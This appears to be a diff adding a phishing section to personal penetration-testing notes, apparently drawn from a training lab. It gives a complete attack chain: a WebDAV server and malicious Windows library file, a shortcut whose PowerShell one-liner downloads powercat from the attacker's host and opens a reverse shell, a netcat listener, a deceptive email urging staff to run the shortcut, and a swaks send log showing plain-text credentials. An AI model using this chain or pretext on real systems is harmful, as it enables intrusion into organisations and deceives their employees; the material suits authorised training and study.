@@ -174,6 +174,119 @@ PowerUp (PowerSploit) remains a fast way to escalate Windows access after landin
 
 ---
 
+## Phishing
+
+* Step 1 setup webdav ( config.Library-ms file )
+```bash
+kali@kali:~$ mkdir /home/kali/beyond/webdav
+
+kali@kali:~$ /home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/beyond/webdav/
+Running without configuration file.
+04:47:04.860 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.
+04:47:04.861 - INFO    : WsgiDAV/4.0.2 Python/3.10.7 Linux-5.18.0-kali7-amd64-x86_64-with-glibc2.34
+04:47:04.861 - INFO    : Lock manager:      LockManager(LockStorageDict)
+04:47:04.861 - INFO    : Property manager:  None
+04:47:04.861 - INFO    : Domain controller: SimpleDomainController()
+04:47:04.861 - INFO    : Registered DAV providers by route:
+04:47:04.861 - INFO    :   - '/:dir_browser': FilesystemProvider for path '/home/kali/.local/lib/python3.10/site-packages/wsgidav/dir_browser/htdocs' (Read-Only) (anonymous)
+04:47:04.861 - INFO    :   - '/': FilesystemProvider for path '/home/kali/beyond/webdav' (Read-Write) (anonymous)
+04:47:04.861 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL.
+04:47:04.861 - WARNING : Share '/' will allow anonymous write access.
+04:47:04.861 - WARNING : Share '/:dir_browser' will allow anonymous read access.
+04:47:05.149 - INFO    : Running WsgiDAV/4.0.2 Cheroot/8.6.0 Python 3.10.7
+04:47:05.149 - INFO    : Serving on http://0.0.0.0:80 ...
+
+
+
+<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+<name>@windows.storage.dll,-34582</name>
+<version>6</version>
+<isLibraryPinned>true</isLibraryPinned>
+<iconReference>imageres.dll,-1003</iconReference>
+<templateInfo>
+<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+</templateInfo>
+<searchConnectorDescriptionList>
+<searchConnectorDescription>
+<isDefaultSaveLocation>true</isDefaultSaveLocation>
+<isSupported>false</isSupported>
+<simpleLocation>
+<url>http://192.168.119.5</url> # ip for kali
+</simpleLocation>
+</searchConnectorDescription>
+</searchConnectorDescriptionList>
+</libraryDescription>
+
+```
+
+* Step 2  config shortcut file
+
+right-click on the Desktop and select New > Shortcut ( On Windows Machine ) and transfer back to kali
+
+```powershell
+powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.5:8000/powercat.ps1'); powercat -c 192.168.119.5 -p 4444 -e powershell"
+```
+* Step 3 Setup powercat and python3 server
+
+```bash
+kali@kali:~/beyond$ cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
+
+kali@kali:~/beyond$ python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+
+```
+* Step 4 nc listener
+
+```bash
+rlwrap nc -lvnp 4444
+```
+
+* Step 5 Create the body content
+
+```bash
+Hey!
+I checked WEBSRV1 and discovered that the previously used staging script still exists in the Git logs. I'll remove it for security reasons.
+
+On an unrelated note, please install the new security features on your workstation. For this, download the attached file, double-click on it, and execute the configuration shortcut within. Thanks!
+
+Alex
+```
+
+* Step 6 Send the phsing email
+```bash
+kali@kali:~/beyond$ sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
+Username: john
+Password: dqsTwTpZPn#nL
+=== Trying 192.168.50.242:25...
+=== Connected to 192.168.50.242.
+<-  220 MAILSRV1 ESMTP
+ -> EHLO kali
+<-  250-MAILSRV1
+<-  250-SIZE 20480000
+<-  250-AUTH LOGIN
+<-  250 HELP
+ -> AUTH LOGIN
+<-  334 VXNlcm5hbWU6
+ -> am9obg==
+<-  334 UGFzc3dvcmQ6
+ -> ZHFzVHdUcFpQbiNuTA==
+<-  235 authenticated.
+ -> MAIL FROM:<john@beyond.com>
+<-  250 OK
+ -> RCPT TO:<marcus@beyond.com>
+<-  250 OK
+ -> DATA
+<-  354 OK, send.
+ -> 36 lines sent
+<-  250 Queued (1.088 seconds)
+ -> QUIT
+<-  221 goodbye
+=== Connection closed with remote host.
+```
+
+---
+
 ### Quick Reference Notes
 - When only an NT hash is available, prepend the empty LM hash (`aad3b435b51404eeaad3b435b51404ee:`) to satisfy tools that expect both halves.
 - Combine NetExec with `-o KERBEROAST` or Impacket’s `GetNPUsers.py` to harvest additional hashes before pivoting.
